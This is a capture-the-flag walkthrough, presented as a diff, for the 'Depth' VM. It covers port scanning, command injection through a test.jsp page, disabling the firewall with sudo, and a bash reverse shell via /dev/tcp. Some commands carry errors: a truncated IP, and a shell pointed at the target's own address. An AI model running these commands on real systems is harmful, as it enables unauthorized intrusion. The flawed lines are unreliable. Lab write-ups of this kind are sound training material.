@@ -1,0 +1,38 @@
+
+Hack the Depth VM (CTF Challenge)
+
+Hello friends! Today we are going to take another CTF challenge known as Depth. The credit for making this vm machine goes to “Dan Lawson” and it is another boot2root challenge where we have to root the server to complete the challenge. You can download this VM here.
+Let’s Breach!!!
+Here, I have it at 192.168.1.135 but you may have a different one.
+Let’s enumerate the ports using nmap
+nmap -sV 192.168.135
+
+Nmap scan shows us port 8080 is open, so we open it in our browser.
+
+We don’t find anything on the index page, but nikto shows us a page called test.jsp.
+nikto -h http://192.168.1.135:8080
+
+We open it and find a page that it is used for looking into directories of the system.
+
+We run ‘ls -al’ to check if it is working.
+ls -al /tmp
+
+When we take a look inside /home/ folder we find a user called bill.
+ls -l /home
+
+Now we find that site has a vulnerability we can change this utility into command injection. We find that with the help of ssh command we can bypass the firewall.
+ssh bill@localhost sudo -l
+
+We find that we can run commands using ssh. Now we disable the firewall.
+ssh bill@localhost sudo ufw disable
+
+Now to gain reverse shell we setup our listener using netcat.
+nc -lvp 4444
+
+After disabling the firewall, we use bash reverse shell to gain access.
+ssh bill@localhost bash -i >& /dev/tcp/192.168.1.135/4444 0>&1
+
+Now as soon as we get reverse shell we go into root folder after entering root folder we get a file called flag.
+We open the flag file and find a congratulatory message for the completion of the CTF challenge.
+
+Author: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact Here
